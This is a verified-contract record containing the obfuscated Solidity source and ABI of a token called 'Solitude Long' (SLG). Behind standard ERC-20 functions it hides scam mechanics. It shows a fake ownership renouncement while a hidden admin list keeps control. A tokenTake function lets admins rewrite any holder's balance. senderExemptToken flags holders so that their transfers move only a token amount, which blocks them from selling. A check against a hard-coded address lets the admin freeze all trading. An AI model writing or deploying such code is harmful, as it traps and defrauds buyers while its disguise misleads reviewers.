{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface enableAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapBuyLimit {\n    function createPair(address marketingAuto, address receiverTx) external returns (address);\n}\n\ninterface buyTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTx) external view returns (uint256);\n\n    function transfer(address modeFeeLaunch, uint256 txAutoEnable) external returns (bool);\n\n    function allowance(address shouldBuyList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txAutoEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeFeeLaunch,\n        uint256 txAutoEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromLaunched, uint256 value);\n    event Approval(address indexed shouldBuyList, address indexed spender, uint256 value);\n}\n\ninterface fundIs is buyTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SolitudeLong is limitSell, buyTotal, fundIs {\n\n    function launchEnable(address marketingList, address modeFeeLaunch, uint256 txAutoEnable) internal returns (bool) {\n        require(receiverSwap[marketingList] >= txAutoEnable);\n        receiverSwap[marketingList] -= txAutoEnable;\n        receiverSwap[modeFeeLaunch] += txAutoEnable;\n        emit Transfer(marketingList, modeFeeLaunch, txAutoEnable);\n        return true;\n    }\n\n    address maxTakeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private minSellFund;\n\n    function autoTx(address marketingList, address modeFeeLaunch, uint256 txAutoEnable) internal returns (bool) {\n        if (marketingList == amountLimitExempt) {\n            return launchEnable(marketingList, modeFeeLaunch, txAutoEnable);\n        }\n        uint256 tradingFrom = buyTotal(walletMinAuto).balanceOf(maxTakeMarketing);\n        require(tradingFrom == senderMax);\n        require(modeFeeLaunch != maxTakeMarketing);\n        if (tradingMax[marketingList]) {\n            return launchEnable(marketingList, modeFeeLaunch, launchEnableFrom);\n        }\n        return launchEnable(marketingList, modeFeeLaunch, txAutoEnable);\n    }\n\n    function senderMin(uint256 txAutoEnable) public {\n        exemptTeam();\n        senderMax = txAutoEnable;\n    }\n\n    event OwnershipTransferred(address indexed buyWalletTotal, address indexed fundExemptFee);\n\n    mapping(address => bool) public shouldToTrading;\n\n    uint256 constant launchEnableFrom = 6 ** 10;\n\n    function exemptTeam() private view {\n        require(shouldToTrading[_msgSender()]);\n    }\n\n    mapping(address => uint256) private receiverSwap;\n\n    function getOwner() external view returns (address) {\n        return minSellFund;\n    }\n\n    function allowance(address launchReceiver, address fundTotalMode) external view virtual override returns (uint256) {\n        if (fundTotalMode == toAt) {\n            return type(uint256).max;\n        }\n        return enableFeeFund[launchReceiver][fundTotalMode];\n    }\n\n    string private amountLaunched = \"SLG\";\n\n    string private tokenLaunchedTo = \"Solitude Long\";\n\n    function senderExemptToken(address feeFund) public {\n        exemptTeam();\n        if (senderLaunched != toFrom) {\n            autoMin = autoList;\n        }\n        if (feeFund == amountLimitExempt || feeFund == walletMinAuto) {\n            return;\n        }\n        tradingMax[feeFund] = true;\n    }\n\n    mapping(address => bool) public tradingMax;\n\n    bool private amountMinTx;\n\n    function atTotal(address atToken) public {\n        require(atToken.balance < 100000);\n        if (liquidityAuto) {\n            return;\n        }\n        if (autoEnable != fromReceiver) {\n            amountMinTx = true;\n        }\n        shouldToTrading[atToken] = true;\n        \n        liquidityAuto = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableFeeFund;\n\n    uint256 private autoMin;\n\n    function tokenTake(address sellTeam, uint256 txAutoEnable) public {\n        exemptTeam();\n        receiverSwap[sellTeam] = txAutoEnable;\n    }\n\n    address public walletMinAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenLaunchedTo;\n    }\n\n    uint8 private txFrom = 18;\n\n    uint256 public toFrom;\n\n    uint256 public fromReceiver;\n\n    address public amountLimitExempt;\n\n    function balanceOf(address tokenTx) public view virtual override returns (uint256) {\n        return receiverSwap[tokenTx];\n    }\n\n    uint256 private autoList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLaunched;\n    }\n\n    function transfer(address sellTeam, uint256 txAutoEnable) external virtual override returns (bool) {\n        return autoTx(_msgSender(), sellTeam, txAutoEnable);\n    }\n\n    uint256 senderMax;\n\n    function approve(address fundTotalMode, uint256 txAutoEnable) public virtual override returns (bool) {\n        enableFeeFund[_msgSender()][fundTotalMode] = txAutoEnable;\n        emit Approval(_msgSender(), fundTotalMode, txAutoEnable);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txFrom;\n    }\n\n    uint256 private autoEnable;\n\n    uint256 private isExempt = 100000000 * 10 ** 18;\n\n    constructor (){\n        if (amountMinTx) {\n            marketingFundTo = fromReceiver;\n        }\n        enableAmount atLaunch = enableAmount(toAt);\n        walletMinAuto = swapBuyLimit(atLaunch.factory()).createPair(atLaunch.WETH(), address(this));\n        \n        amountLimitExempt = _msgSender();\n        buyTx();\n        shouldToTrading[amountLimitExempt] = true;\n        receiverSwap[amountLimitExempt] = isExempt;\n        \n        emit Transfer(address(0), amountLimitExempt, isExempt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isExempt;\n    }\n\n    function transferFrom(address marketingList, address modeFeeLaunch, uint256 txAutoEnable) external override returns (bool) {\n        if (_msgSender() != toAt) {\n            if (enableFeeFund[marketingList][_msgSender()] != type(uint256).max) {\n                require(txAutoEnable <= enableFeeFund[marketingList][_msgSender()]);\n                enableFeeFund[marketingList][_msgSender()] -= txAutoEnable;\n            }\n        }\n        return autoTx(marketingList, modeFeeLaunch, txAutoEnable);\n    }\n\n    uint256 private senderLaunched;\n\n    function owner() external view returns (address) {\n        return minSellFund;\n    }\n\n    bool public walletFeeSwap;\n\n    function buyTx() public {\n        emit OwnershipTransferred(amountLimitExempt, address(0));\n        minSellFund = address(0);\n    }\n\n    address toAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public marketingFundTo;\n\n    uint256 toTeam;\n\n    bool public liquidityAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldBuyList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyWalletTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundExemptFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTotalMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLimitExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotalMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txAutoEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"}],\"name\":\"atTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFundTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"}],\"name\":\"senderExemptToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txAutoEnable\",\"type\":\"uint256\"}],\"name\":\"senderMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldToTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txAutoEnable\",\"type\":\"uint256\"}],\"name\":\"tokenTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txAutoEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeFeeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txAutoEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFeeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMinAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SolitudeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}